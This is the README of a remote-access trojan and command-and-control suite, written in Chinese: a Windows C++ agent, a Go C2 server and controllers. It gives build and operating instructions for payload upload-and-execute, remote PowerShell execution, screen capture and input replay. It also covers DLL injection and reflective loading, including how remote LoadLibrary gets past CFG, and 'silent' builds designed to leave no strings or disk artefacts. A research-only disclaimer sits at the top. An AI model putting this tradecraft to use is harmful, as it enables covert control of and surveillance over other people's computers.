# C2 远控系统（rat/c2）

> **⚠️ 免责声明**
>
> 本项目**仅供安全研究、教学与已获明确授权的测试**使用。
> **严禁**将其用于任何未授权的入侵、控制、监听或数据窃取等非法用途。
> 使用者须自行确保行为合法合规，并**独立承担由此产生的一切后果与法律责任**；
> 作者不对任何使用、滥用或由此造成的损害负责，亦不提供任何形式的担保。

基于《ARCHITECTURE.md》架构设计计划书实现的可扩展 C2 远控系统。

- **客户端**：C++（Windows；一套 `client/core` 编成**多个模块产物**，每个模块 = 独立进程 + 直连 C2，见下）
- **服务端**：Go（C2 中转/管理服务器）
- **控制端**：Go CLI（`ratctl`）+ C++ GUI（`im_ctl`）+ C++ 轻量查看器（`viewer`）
- **协议**：自定义二进制（20B 固定头 + 分模块指令码），AES-256-GCM 加密（PSK→HKDF 派生）
- **当前状态**：核心通信 + beacon/TCP 双信道 + 屏幕流/输入回放 + 截屏 + **payload 上传执行** +
  ratctl 命令补全 + viewer + **模块化拆分（sys / screen 模块 + 可复制模板）** +
  **DLL 形态（rundll32 / LoadLibrary / 注入）** + **反射加载实测**（外部 RfUdrl 出 PIC，`tools/runpic` 执行）
  （详见 `docs/DESIGN.md`、`docs/PROGRESS.md`）

---

## 目录

- [目录结构](#目录结构)
- [快速开始](#快速开始)
- [构建](#构建)
- [测试](#测试)
- [使用](#使用)
- [开发说明（加模块 / 加能力）→](docs/DEVELOPMENT.md)
- [排错](#排错)
- [协议要点](#协议要点)
- [路线图](#路线图)

---

## 目录结构

```
c2-suite/
├── docs/protocol.md           # 协议规范 v1（两端唯一契约；§10 为 payload 上传）
├── docs/DEVELOPMENT.md        # **开发说明**：加模块/加能力/边界判断/常见陷阱
├── docs/DESIGN.md             # 设计说明（含手动映射契约、注入取舍）
├── docs/PROGRESS.md           # 进度与实测记录（§8 历史、§9 模块化）
├── internal/protocol/         # Go 共享协议层（头编解码 + AES-GCM/HKDF + 向量单测）
│   └── testdata/vectors.json  # 测试向量（Go/C++ 交叉验证）
├── cmd/genvectors/            # 测试向量生成器（go run ./cmd/genvectors）
├── server/                    # Go C2 服务器
│   ├── cmd/c2server/          # 4444 会话/转发、8080 beacon、4445 屏幕流中继
│   └── internal/session/      # 会话注册表（离线/回收）
├── ctl/                       # Go CLI
│   └── cmd/ratctl/            # 交互式 shell（会话/系统/截屏/远控/payload/raw）
├── client/                    # C++ Agent（多模块解决方案：sys / screen / template）
│   ├── agents.sln             # ★ VS 打开这个：模块分组，core(共享)/docs 有独立文件夹
│   ├── RatAgent.sys.exe.vcxproj  # sys 模块 EXE 形态 → RatAgent.sys.exe
│   ├── RatAgent.sys.vcxproj      # sys 模块 DLL 形态 → RatAgent.sys.dll
│   ├── caps_sys.cpp           # "sys"模块的能力清单（每个模块工程一份）
│   ├── agents/_template/      # **模块工程模板**：复制它开新模块（见其 README）
│   ├── agents/screen/         # "screen"（远程桌面）模块：抓屏/屏幕流/输入回放/桌面切换
│   └── core/                  # 共享内核（被每个模块编译进去）
│       ├── capability.*       # ★ 能力注册表：core 与模块之间唯一接口
│       ├── module_id.h        # 模块命名空间 / 能力位
│       ├── agent_runtime.*    # 共用运行核心（启停/路径/停止事件/自启动）
│       ├── agent_dll.cpp      # DLL 外壳（导出 + DllMain + 加载即自启）
│       ├── main.cpp           # EXE 外壳（所有模块共用）
│       └── protocol/crypto/net/session/beacon/cmd_dispatch
├── viewer/                    # C++ Win32 远控查看器（独立 CMake 工程）
├── im_ctl/                    # C++ ImGui 控制端（第三方依赖不在仓库内，见构建章节）
├── tools/runpic/              # PIC blob 执行器（反射加载验证 harness）
└── scripts/                   # 验收脚本（见"测试"章节）
    ├── check_projects.py      # 工程结构自检（引用/分组/漏项/XML）
    ├── check_docs.py          # 文档自检（本地链接、反引号路径是否有效）
    ├── e2e_modules.py         # 模块命名空间共存（sys + probe）
    ├── e2e_screen.py          # 远程桌面模块（截屏/流/停流/sys 无屏幕指令）
    ├── e2e_template.py        # 模块模板（自定义指令 + core 指令）
    ├── e2e_rdll.py            # 反射加载 P1/P2/P3（含空触发器文件）
    ├── e2e_quiet.py           # 静默构建（零输出、零落盘）
    └── e2e_m1~m4.py           # 早期脚本（历史，路径已过时）
```

---

## 快速开始

最短路径（Windows，PowerShell；详细说明见后续章节）：

```powershell
# 0) 工具链路径（按你的实际安装位置调整）
$msb  = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'
$base = "$PWD/build"

# 1) Go：服务端 + 控制端 → build/bin/
$env:GOCACHE = "$PWD/.gocache"
go build -o build/bin/c2server.exe ./server/cmd/c2server
go build -o build/bin/ratctl.exe   ./ctl/cmd/ratctl

# 2) C++：sys 模块 EXE → build/agent-sys/bin/
& $msb client\RatAgent.sys.exe.vcxproj -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir=$base/agent-sys/obj/ -p:OutDir=$base/agent-sys/bin/

# 3) 跑起来（分别开三个终端）
.\build\bin\c2server.exe                                        # ① C2（4444 / 4445 / 8080）
.\build\agent-sys\bin\RatAgent.sys.exe 127.0.0.1 4444 -tcp       # ② Agent（TCP 长连接）
.\build\bin\ratctl.exe                                          # ③ 控制端
#    ratctl> sessions            → 应看到 Windows (sys) 标签与能力位
#    ratctl> use sys             → 按模块标签切换（无需手抄 32 位 id）
#    ratctl> sysinfo / exec whoami
```

> 想跑**远程桌面**（截屏 / 屏幕流）：还需要编 `screen` 模块（见 [构建](#构建)），
> 然后在 ratctl 里 `use screen` → `screenshot <file>` / `screen`。

> 要**加一个新模块 / 新能力**？看 [docs/DEVELOPMENT.md](docs/DEVELOPMENT.md)
> （模板复制 → 工程四处改动 → 登记指令 → 验收，含契约与踩坑清单）。

---

## 构建

### 0. 工具链与前置

| 组件 | 要求 | 说明 |
|---|---|---|
| VS / MSBuild | VS2022/2026，工具集 `v145`（本文用 VS18/2026 Community 路径） | 只编 C++ 模块需要 |
| Go | `go 1.25`（`go.mod`：module `ratc2`） | 服务端 + `ratctl` |
| CMake ≥ 3.16 | `viewer` / `im_ctl` / `runpic` | 可选（模块与测试不依赖） |
| Python 3 | 跑 `scripts/*.py` 验收 | 只跑测试需要 |
| Kali（可选） | `crystalpalace/cpl` + 外部 RfUdrl loader | 只有反射加载（PIC）需要 |

### 1. Go：服务端 + 控制端

产物统一放 `build/bin/`（**验收脚本按这个路径找它们**）：

```powershell
$env:GOCACHE = "$PWD/.gocache"                              # 受限/沙箱环境建议显式指定
go build -o build/bin/c2server.exe ./server/cmd/c2server    # TCP 4444 + HTTP 8080 + 流中继 4445
go build -o build/bin/ratctl.exe   ./ctl/cmd/ratctl         # 交互式控制端
go test ./...                                               # 协议单测（含两端共用测试向量）
```

### 2. C++：模块

一套 `client/core` 编成多个**模块产物**，命名规则 `RatAgent.<模块>.<形态>`。
用 VS 打开 [client/agents.sln](client/agents.sln)（sys / screen / template，各 EXE + DLL 两个工程），
或命令行：

```powershell
$msb = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'

# 整个解决方案（6 个工程），产物统一落 client\x64\<Config>\
& $msb client\agents.sln -p:Configuration=Release -p:Platform=x64

# 或单独编某个工程
& $msb client\RatAgent.sys.exe.vcxproj -p:Configuration=Release -p:Platform=x64  # → RatAgent.sys.exe
& $msb client\RatAgent.sys.vcxproj     -p:Configuration=Release -p:Platform=x64  # → RatAgent.sys.dll
```

**模块变体**（编译期属性，`-p:` 覆盖）：

```powershell
# 静默版：无诊断输出、磁盘零写入（见"静默构建"）
& $msb client\RatAgent.sys.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0

# 同一工程出"另一个模块"（验收用合成模块 probe：模块名 + 产物名 + 能力位都要改）
& $msb client\RatAgent.sys.exe.vcxproj -p:Configuration=Release -p:Platform=x64 `
      -p:RatAgentModuleId=probe -p:TargetName=RatAgent.probe "-p:RatAgentModuleCaps=(c2::kCapRemote)"
```

> **解决方案构建的几个要点**（都是踩过的坑）：
> - 6 个产物都落 `client\x64\<Config>\`，**符号文件与产物同名**（`RatAgent.sys.dll` ↔ `RatAgent.sys.dll.pdb`），
>   不会互相覆盖；
> - 每个工程有**自己的中间目录**（`<工程名>\x64\<Config>\`）：EXE 与 DLL 工程编译同一批 core 源码但宏不同
>   （`_CONSOLE` vs `_USRDLL`），共用中间目录会导致 `.obj` 互相覆盖、**静默产出错误二进制**；
> - Debug / Release **都是静态 CRT `/MT`**（`dumpbin /dependents` 只有系统 DLL），反射加载验证用 Release；
> - 工程文件名决定默认 `TargetName`：改工程文件名时**必须**显式写 `<TargetName>`，否则会产出
>   `RatAgent.sys.exe.exe` 这种名字。

### 3. 构建到 `build/`（验收脚本要求的布局）★

`scripts/` 下的验收脚本按**固定路径**读取产物。要跑测试，就照下面这套命令产出
（`-p:IntDir=`/`-p:OutDir=` 把中间文件与产物都放进工作区 `build/`，也顺便避开既有 VS 目录的 ACL 问题）：

```powershell
$msb  = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'
$base = "$PWD/build"
function B($proj, $out, $extra) {
  & $msb $proj -p:Configuration=Release -p:Platform=x64 @extra `
        -p:IntDir=$base/$out/obj/ -p:OutDir=$base/$out/bin/ -v:m -nologo
}

# sys 模块：EXE / DLL / 静默 DLL
B client\RatAgent.sys.exe.vcxproj agent-sys   @()
B client\RatAgent.sys.vcxproj     dll-release @()
B client\RatAgent.sys.vcxproj     dll-quiet   @('-p:RatAgentDebug=0')

# 合成模块 probe（e2e_modules 用）
B client\RatAgent.sys.exe.vcxproj agent-probe `
  @('-p:RatAgentModuleId=probe','-p:TargetName=RatAgent.probe','-p:RatAgentModuleCaps=(c2::kCapRemote)')

# screen / template 模块（注意：这两个的输出目录不带 bin/ 一层）
& $msb client\agents\screen\RatAgent.screen.exe.vcxproj -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir=$base/agents/screen/exe-obj/ -p:OutDir=$base/agents/screen/exe/
& $msb client\agents\screen\RatAgent.screen.vcxproj     -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir=$base/agents/screen/dll-obj/ -p:OutDir=$base/agents/screen/dll/
& $msb client\agents\_template\RatAgent.template.exe.vcxproj -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir=$base/agents/template/exe-obj/ -p:OutDir=$base/agents/template/exe/
& $msb client\agents\_template\RatAgent.template.vcxproj     -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir=$base/agents/template/dll-obj/ -p:OutDir=$base/agents/template/dll/

# PIC blob 执行器（反射加载验收用）
cmake -S tools/runpic -B build/runpic
cmake --build build/runpic --config Release        # → build/runpic/bin/runpic.exe
```

### 4. 其它组件

```powershell
# viewer（C++ Win32 查看器，不依赖第三方）
cmake -S viewer -B viewer/build
cmake --build viewer/build --config Debug          # → viewer/build/bin/viewer.exe

# im_ctl（ImGui 控制端，可选）
cmake -S im_ctl -B im_ctl/build
cmake --build im_ctl/build --config Debug
```

> 本仓库**不托管** `im_ctl/external/`（imgui / glad / glfw 第三方源码，且 imgui 自带独立 `.git`，见 `.gitignore`）。
> 要构建 im_ctl，请先自行获取 `imgui`（含 `backends/`）、`glad`（含 `src/glad.c`）、
> `glfw`（含 `lib-vc2026/glfw3.lib`）放到 `im_ctl/external/` 下，或改用 git submodule。
> viewer 不依赖这些，可直接构建。

### 5. 反射加载 PIC（可选，需要 Kali）

反射加载验收（`e2e_rdll.py` / `e2e_quiet.py`）需要一个**内嵌 DLL 的 PIC blob**，
它由外部加载器 [RfUdrl]（Crystal Palace + LibTCG）在 Kali 上生成：

```bash
# 在 Kali 上（参考环境：/home/kali/opts/tcg/RfUdrl，cpl 在 /home/kali/opts/crystalpalace/cpl）
scp build/dll-release/bin/RatAgent.sys.dll   kali@<vm>:/home/kali/opts/tcg/RfUdrl/RatAgent.sys.dll
scp build/dll-quiet/bin/RatAgent.sys.dll     kali@<vm>:/home/kali/opts/tcg/RfUdrl/RatAgent.sys.quiet.dll
ssh kali@<vm> "cd /home/kali/opts/tcg/RfUdrl && \
  /home/kali/opts/crystalpalace/cpl link loader.spec RatAgent.sys.dll sys.bin && \
  /home/kali/opts/crystalpalace/cpl link loader.spec RatAgent.sys.quiet.dll sys-quiet.bin"
scp kali@<vm>:/home/kali/opts/tcg/RfUdrl/sys.bin        build/e2e/out.bin
scp kali@<vm>:/home/kali/opts/tcg/RfUdrl/sys-quiet.bin  build/e2e/out_quiet.bin
```

> ⚠ **每次改动 `client/core` 后都必须重链 PIC**，否则 `e2e_rdll` 跑的是**旧代码**
> （症状：测试"全 PASS"但新行为没生效）。快速判定新代码是否进了 PIC：
> ```powershell
> Select-String -Path build/e2e/out.bin -Pattern '<新加的字符串>' -Encoding utf8 -List
> ```
> 注意静默版 PIC（`out_quiet.bin`）里**不会有**任何诊断串——那是 `RatAgentDebug=0` 的设计。

### 6. 静默构建（无诊断输出、无落盘文件）

诊断输出与落盘由 [client/core/agent_debug.h](client/core/agent_debug.h) 的两个**编译期开关**控制：

| 属性 | 默认 | 作用 |
|---|---|---|
| `RatAgentDebug` | `1` | `0` = 诊断宏 `AGENT_LOG(...)` 编译为空操作：**格式串不会进二进制**、不落日志、不碰 stdout |
| `RatAgentPersistId` | 跟随 `RatAgentDebug` | `0` = `<module>.id` 不落盘：身份只在内存（重启后变化），磁盘零写入 |

```powershell
:: 静默版：无任何输出、磁盘零写入
... -p:RatAgentDebug=0
:: 静默但保留稳定身份（只落 id 文件，不打印、不落日志）
... -p:RatAgentDebug=0 -p:RatAgentPersistId=1
```

实测（Release）：DLL 从 374,784 B 降到 351,232 B，6 条典型诊断串由 6/6 命中变为 **0/6**；
静默版仍能上线并应答指令，且**不创建目录、不写日志/id**（`python scripts/e2e_quiet.py`）。

> 代价：静默版重启后 `agent_id` 变化 ⇒ "重连同 ID" 与 "另一进程凭 id 文件停止" 不再成立
> （仍可按已知的 32 位 hex 触发命名事件）。跨进程停止用的命名事件
> `Local\RatAgentStop.<id>` 仍会创建 —— 它是内核对象，不是磁盘 IOC。
> **排查问题时不要用静默版**（日志被编掉了）。

### 7. 产物总表

| 路径 | 模块 | 形态 / 用途 |
|---|---|---|
| `build/bin/c2server.exe` | — | Go 服务端（4444 / 4445 / 8080） |
| `build/bin/ratctl.exe` | — | Go 交互式控制端 |
| `build/agent-sys/bin/RatAgent.sys.exe` | sys | EXE（独立部署 / 调试） |
| `build/dll-release/bin/RatAgent.sys.dll` | sys | DLL（rundll32 / 宿主 / 注入 / 反射加载） |
| `build/dll-quiet/bin/RatAgent.sys.dll` | sys | DLL（静默：零输出零落盘） |
| `build/agent-probe/bin/RatAgent.probe.exe` | probe（合成） | EXE（命名空间共存验收） |
| `build/agents/screen/exe/RatAgent.screen.exe`<br>`build/agents/screen/dll/RatAgent.screen.dll` | screen | 远程桌面模块 |
| `build/agents/template/exe/RatAgent.template.exe`<br>`build/agents/template/dll/RatAgent.template.dll` | template | 模块工程模板 |
| `build/e2e/out.bin` / `out_quiet.bin` | sys | 反射加载 PIC（内嵌对应 DLL） |
| `build/runpic/bin/runpic.exe` | — | PIC blob 执行器 |
| `client/x64/<Config>/` | 全部 | 解决方案构建的产物与符号（VS 里直接生成时用这个） |

---

## 测试

### 0. 静态自检（不构建，最快）

```powershell
python scripts/check_projects.py    # 工程结构
python scripts/check_docs.py        # 文档链接
```

**`check_projects.py`** 检查 6 个 `.vcxproj`：① XML 合法 ② 引用的文件是否都存在
③ 是否有 `<工程名>.vcxproj.filters`（**VS 的 C++ 过滤器只读这个文件**）④ 工程里每个文件是否都挂了
分组、`.filters` 与 `.vcxproj` 是否同步（漏项/幽灵项）⑤ 目录里有没有"游离源文件"
（写了却没进工程 ⇒ 漏编译）。

**`check_docs.py`** 检查 README 与 `docs/*.md`：① 本地 Markdown 链接是否有效
② 反引号里引用的仓库路径是否存在（生成目录/第三方依赖/历史改名对照有显式豁免清单）。

> 改名/搬文件/加文件之后先跑这两个，比在 VS 里或浏览器里肉眼找快得多。

### 1. 端到端套件

| 脚本 | 前置产物 | 验证内容 |
|---|---|---|
| `e2e_modules.py` | `build/bin/*`、`agent-sys`、`agent-probe` | **同机多模块共存**：各自 `<module>.id`、id 不冲突（服务端按 id 索引，冲突会踢旧会话）、C2 侧标签 `Windows (sys)`/`(probe)`、能力位 `0x1`/`0x2` |
| `e2e_screen.py` | `build/bin/*`、`agent-sys`、`agents/screen/exe` | **远程桌面模块**：sys+screen 共存；screen 的 `0x1001` 截屏（JPEG）、`0x1002` 开/停流（C2 日志出现 4445 中继帧）；**sys 收到 0x1001/0x1002 返回未知指令**；`use screen` 标签解析 |
| `e2e_template.py` | `build/bin/*`、`agents/template/exe` | **模块模板**：模板独立上线（标签 `Windows (template)`、能力位 `0x1`）、自定义指令 `raw 2001 deadbeef` 有回包、core 的 `sysinfo` 照常 |
| `e2e_rdll.py` | `build/bin/*`、`dll-release`、`build/e2e/out.bin`、`runpic` | **反射加载**（P1/P2/P3）：宿主模块表里**没有** `RatAgent.sys.dll`（确为手动映射）；P1 触发器带参数 → 用文件参数 + 跨进程优雅停止；P2 无触发器文件 → 默认配置自启；**P3 触发器为空文件 → 同样默认配置**（日志点明原因） |
| `e2e_quiet.py` | `build/bin/*`、`build/e2e/out_quiet.bin`、`runpic` | **静默构建**：零 stdout、不创建目录、不写日志/id，但仍能上线应答 |

```powershell
python scripts/check_projects.py
python scripts/e2e_modules.py
python scripts/e2e_screen.py
python scripts/e2e_template.py
python scripts/e2e_rdll.py
python scripts/e2e_quiet.py
```

每个脚本自管进程与临时目录（默认在 `build/e2e/` 下），结束时清理；输出以
`== RESULT: ALL PASS` 结尾，失败项以 `[FAIL]` 标出并附现场文本。

### 2. 一键全跑

```powershell
$env:PYTHONIOENCODING = 'utf-8'      # 让中文断言在控制台正确显示
foreach ($s in 'check_projects','check_docs','e2e_modules','e2e_screen','e2e_template','e2e_rdll','e2e_quiet') {
  $r = python "scripts/$s.py" 2>&1 | Select-Object -Last 1
  "{0,-16} {1}" -f $s, ($r -replace '[^\x20-\x7e]','')
}
```

### 3. 反射加载链路的准备顺序

```
改 client/core  →  重建 dll-release/dll-quiet（§3）  →  在 Kali 重链 PIC（§5）
                →  确认新串进了 out.bin  →  跑 e2e_rdll / e2e_quiet
```

### 4. 提交前回归清单

1. `python scripts/check_projects.py` + `python scripts/check_docs.py`
2. 重建 `build/` 布局的全部产物（§3）+ 重链 PIC（§5）
3. 五个 e2e 全绿
4. 动过 `client/core` 的公共契约（命名空间/能力注册表/自启动）时，同步 README / DESIGN / PROGRESS / DEVELOPMENT

> **早期脚本** `e2e_m1~m4.py` 是模块化改造**之前**的验收（beacon 交互、屏幕流、M1/M2 里程碑），
> 里面的路径还是旧的 `bin/`、`client/x64/Debug/` 布局，已不随当前结构维护；
> 需要时按现在的能力重写（现有 `e2e_*` 已覆盖其验证点）。

---

## 使用

### 1. 启动 C2

```powershell
.\build\bin\c2server.exe        # 4444 会话/转发（Agent + ctl 共用）、4445 屏幕流中继、8080 beacon
```

### 2. 启动 Agent

```powershell
# EXE 形态：beacon（默认，HTTP 轮询 8080）或 TCP 长连接（4444）
.\build\agent-sys\bin\RatAgent.sys.exe 127.0.0.1 8080 -s 5
.\build\agent-sys\bin\RatAgent.sys.exe 127.0.0.1 4444 -tcp
.\build\agent-sys\bin\RatAgent.sys.exe --selftest        # 只跑加密自检后退出

# 远程桌面模块（提供 0x1001 截屏 / 0x1002 屏幕流）
.\build\agents\screen\exe\RatAgent.screen.exe 127.0.0.1 4444 -tcp
```

> 想看模块标签与能力位，**用 `-tcp`**：beacon 信道的会话在服务端是硬编码 `OSInfo="beacon-agent"`
> 的，握手元数据（os/plugins）只走 TCP 长连接的 HELLO（已知缺口，见"协议要点"）。

### 3. Agent 两种形态

| 形态 | 入口 | 适用场景 | 身份 / 日志位置 |
|---|---|---|---|
| `RatAgent.<module>.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `<module>.id`；stdout |
| `RatAgent.<module>.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其它程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\<module>.id` + `<module>.log`（可用 `id=`/`log=` 覆盖） |

DLL 的三种用法（都支持 `-tcp`；默认 beacon `127.0.0.1:8080`、轮询 5s）：

```
:: 1) rundll32（Start 阻塞驻留，保证进程存活；Stop 可在另一个进程里触发跨进程停止事件）
rundll32 RatAgent.sys.dll,Start 127.0.0.1,8080,-s,5
rundll32 RatAgent.sys.dll,Stop  id=<module>.id 路径 或 32 位 hex

:: 2) 自己的加载器 / 宿主（同进程启停，可 FreeLibrary 卸载）
LoadLibraryW(L"RatAgent.sys.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()

:: 3) 注入 / 反射加载（远程 LoadLibrary，或手动映射；这类场景没有参数通道）
::    本 DLL **加载即自启**：见下面"自启动触发器"
```

> **为什么注入不直接调导出**：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"
> （表现为 `0xC0000409`/`__fastfail`），但远程 `LoadLibraryW`（kernel32 地址）仍然可用。
> 因此推荐"远程加载 + 触发器自启动"。
>
> **手动映射契约**：DLL 用静态 CRT（`/MT`，无 VC 运行库 DLL 依赖），映射方**必须先调用入口点**
> （`DllMainCRTStartup`，`DLL_PROCESS_ATTACH`）让 CRT 完成初始化，之后才能调用导出；
> 代码不依赖 `GetModuleFileName`/CWD/TLS，导出内不抛异常。

### 4. 多模块共存与目标选择

每个模块是**独立进程**，各有自己的 id/日志/自启文件（`<module>` 前缀），可以同机同时跑：

| 项 | 规则 |
|---|---|
| 模块名 | 编译期常量，见 [client/core/module_id.h](client/core/module_id.h)（`RAT_MODULE_ID`，默认 `sys`） |
| 身份 / 日志 / 自启参数 | `%LOCALAPPDATA%\RatAgent\<module>.id` / `<module>.log` / `<module>.autostart.args`；EXE 形态的 id 落 CWD |
| 停止事件 | `Local\RatAgentStop.<agent_id_hex>`（**刻意不带模块前缀**：各模块 id 随机不撞名，任一模块的 DLL 都能停任意模块的实例） |
| C2 侧标签 | 握手 `os_info` = `Windows (<module>)`（仅 `-tcp` 可见） |
| 能力位 | `plugins` 位图：`bit0` 系统类、`bit1` 远程桌面 |

```text
ratctl> sessions
  id        ip:port            os                  plugins     last
  486c516e  127.0.0.1:58484    Windows (screen)    0x00000002  ...
  1358395d  127.0.0.1:58485    Windows (sys)       0x00000001  ...

ratctl> use screen            # 按模块标签解析（唯一命中才行；多台机器同名会列出候选要你改用 id 前缀）
```

> ⚠ 服务端按 `agent_id` 索引：**两个模块共用同一份 id 会互相踢下线**。
> 复制模板开新模块时务必改 `RatAgentModuleId`（决定 id 文件名）——这也是命名空间存在的理由。

### 5. ratctl 常用操作

```text
sessions                              列出在线 Agent（含模块标签与能力位）
use <agent_id|模块名> / back          切换目标（支持 id 前缀；也可用模块名如 use screen）
session <agent_id> / kill <id>        会话详情 / 踢下线

sysinfo                               系统信息（OS/CPU/内存/磁盘/主机名/显卡）
exec <powershell 命令>                执行并回收输出
raw <cmd_hex> [payload_hex]           发送任意业务指令（测新模块的自定义指令）
screenshot [id] <file>                远程截屏存盘（JPEG）
screen [id] [fps] [quality] [scale]   拉起 viewer 查看/操作远程屏幕
stop                                  停止当前 Agent 的屏幕流
payload <file> [name] [--args <参数>] 上传二进制 payload 并执行
```

> `screenshot` / `screen` 需要**目标模块支持**：这两个指令（`0x1001`/`0x1002`）现在由
> **screen 模块**提供，对 `sys` 模块发会返回未知指令（`status=0x01`）。

### 6. viewer 拉流

```powershell
.\viewer\build\bin\viewer.exe
```

`ratctl` 的 `screen <id>` 会拉起 viewer 并转发 `0x1002`；帧通过 C2 的 4445 中继发给
**发起 `0x1002` 的那条 ctl 连接**（所以流是配对到 viewer 的），输入事件反向经同一通道下发。
正常关闭 viewer 会发 `0x1002 control=0`；兜底可用 `ratctl> stop`。

### 7. 自启动触发器（DLL 加载即自启）

`LoadLibrary` 该 DLL（或反射加载）后，DllMain 之后的线程会延迟 300ms 解析并启动 agent：

| 触发器文件 | 行为 |
|---|---|
| `%LOCALAPPDATA%\RatAgent\<module>.autostart.args`<br>（或 `%TEMP%\RatAgent\<module>.autostart.args`）**存在且内容非空** | 用文件里的参数串启动（优先级最高，语法同 `StartAgent`） |
| **文件不存在** 或 **内容为空/全空白** | 一律用内置默认配置（beacon `127.0.0.1:8080`、轮询 5s） |

- 只取文件**第一行**；去掉首尾空白后为空 → 视为"未触发"（并继续探测下一个候选路径）。
- 空文件被跳过时日志会点明：`[*] autostart: <path> is empty -> treated as no trigger (use default config)`。
- 写完触发器记得清理：`%LOCALAPPDATA%\RatAgent\<module>.autostart.args`（或 `%TEMP%` 下同名）。

> ⚠ **加载即自启的副作用**：自启线程（延迟 300ms）与显式入口（rundll32 的 `Start`/`Stop`、
> 宿主 `StartAgent`）存在竞争——显式入口先到就正常接管，晚到会被默认自启抢先
> （参数被忽略 / `Stop` 退化为同进程停止）。**不调用任何导出的常驻 `LoadLibrary` 宿主
> 会在自己进程里自动起一份默认 agent**。
>
> ⚠ 触发器里的参数**解析失败**（例如 `-tpcc` 拼错）时，自启动会**静默不启动**，
> 只在日志留一行 `bad args`（宁可不上线，也不带错配置上线）。

### 8. 停止与清理

```powershell
# 跨进程优雅停止（另一个进程里执行；id= 可给 id 文件路径或 32 位 hex）
rundll32 RatAgent.sys.dll,Stop id=%LOCALAPPDATA%\RatAgent\sys.id

# ratctl 里踢会话（beacon 会话无 TCP 可关，只做登记层下线）
ratctl> kill <agent_id>

# 收尾（验收脚本异常退出后，端口可能仍被占用）
taskkill /F /IM c2server.exe 2>$null
taskkill /F /IM RatAgent.sys.exe 2>$null
taskkill /F /IM RatAgent.screen.exe 2>$null
taskkill /F /IM viewer.exe 2>$null
```

---

## 排错

| 现象 | 原因 | 处理 |
|---|---|---|
| 验收脚本输出 `== RESULT: PREREQ MISSING` | 产物没按脚本期望的布局构建 | 照"构建 → §3 构建到 `build/`"重建 |
| `e2e_rdll` 全 PASS 但新改动"没生效" | **PIC 没重链**，跑的是旧 DLL | 重链 PIC（"构建 → §5"），并用 `Select-String` 确认新串进了 `out.bin` |
| Kali 相关命令 `ssh: connect ... timed out` | 虚拟机没开 / 网络不通 | 先 `ssh kali@<vm> "echo OK"` 确认连通再继续 |
| MSBuild 报 `无法创建目录 ... 访问被拒绝` | 受限/沙箱环境下不允许写既有目录树 | 用 `-p:IntDir=`/`-p:OutDir=` 指到工作区 `build/` 下，或改用非受限方式运行 |
| VS 里某个工程的文件**平铺**、没有分组 | 缺 `<工程名>.vcxproj.filters`，或与 `.vcxproj` 不同步 | `python scripts/check_projects.py` 定位；过滤器**只**读 `.filters`（写在 `.vcxproj` 里无效） |
| VS 里节点带警告 / 打不开 | 工程引用了**不存在**的文件 | `check_projects.py` 第 ② 项会列出具体路径 |
| 两个模块**互相踢下线** | 共用同一份 id（模块名/`TargetName` 没改） | 确认 `RatAgentModuleId` 与 id 文件名是各自模块的 |
| 静默版"没有日志" | `RatAgentDebug=0` 把 `AGENT_LOG` 连同字符串一起编掉了 | 这是设计；排查请用默认构建 |
| agent 上线了但 `sessions` 看不到模块标签 | 用的是 beacon 信道 | 用 `-tcp`（beacon 会话在服务端硬编码 `beacon-agent`，已知缺口） |
| `screenshot`/`screen` 报未知指令 | 目标是 `sys` 模块 | 这两个指令在 `screen` 模块上：`use screen` 后重试 |
| EXE 形态 id 文件落在 CWD 而不是 `%LOCALAPPDATA%` | 设计如此（EXE 用 CWD 下的 `<module>.id`） | 想固定位置就用 `id=` 指定 |
| 端口 4444/4445/8080 被占用 | 上次的进程没退干净 | 见"使用 → §8 停止与清理"的 `taskkill` |
| `git` 提交报 `index.lock: Permission denied` | 受限/沙箱环境不允许写 `.git` | 用非受限方式提交 |
| 改完 `client/core` 后 C++ 模块行为不一致 | 只重建了部分产物 | 按"测试 → §4 提交前回归清单"全量重建 |

---

## 协议要点

- 数据包：`magic(0x5A5A) + version + flags + seq + timestamp + cmd + plugin + status + payload_len + payload`
- 加密：payload 用 AES-256-GCM（12B 随机 nonce），头部明文；密钥 = `HKDF-SHA256(PSK, client_nonce||server_nonce, "rat-v1")`
- 指令码分段：`0x0` 核心 / `0x1` 远程控制 / `0x2` 文件 / `0x3` 系统 / `0x4` 管理（详见 `docs/protocol.md`）
- 已实现业务指令：`0x1001` 截屏、`0x1002` 屏幕流（**均在 screen 模块**）、`0x3001` 系统信息、
  `0x3008` PowerShell、`0x3009` payload（core 内置）
- ⚠ 已知缺口：beacon 信道的会话元数据（os/plugins）在服务端是硬编码的，模块标签只在 `-tcp` 可见；
  要补需一次小的协议扩展（计划中）

## 路线图

- **M1 ✅** 协议 + 核心通信（握手/心跳/会话/离线判定）
- **M2 ✅** beacon 信道 + 命令分发（SYS_INFO/EXEC_PS）
- **M3 ✅** 屏幕流 + 输入回放（4445）+ 截屏 + payload 上传执行 + ratctl 补全 + viewer
- **M3.5 ✅** Agent 双产物（EXE/DLL）+ 可停止/可卸载 + 注入自启动触发器
- **M3.6 ✅** 模块化：命名空间 → 能力注册表解耦 core → 远程桌面拆成独立模块（详见 `docs/PROGRESS.md` §9）
- **M4** 插件框架（`plugin_api.h` + 加载器）、文件管理、进程/服务/注册表、多 CLI、打包与文档
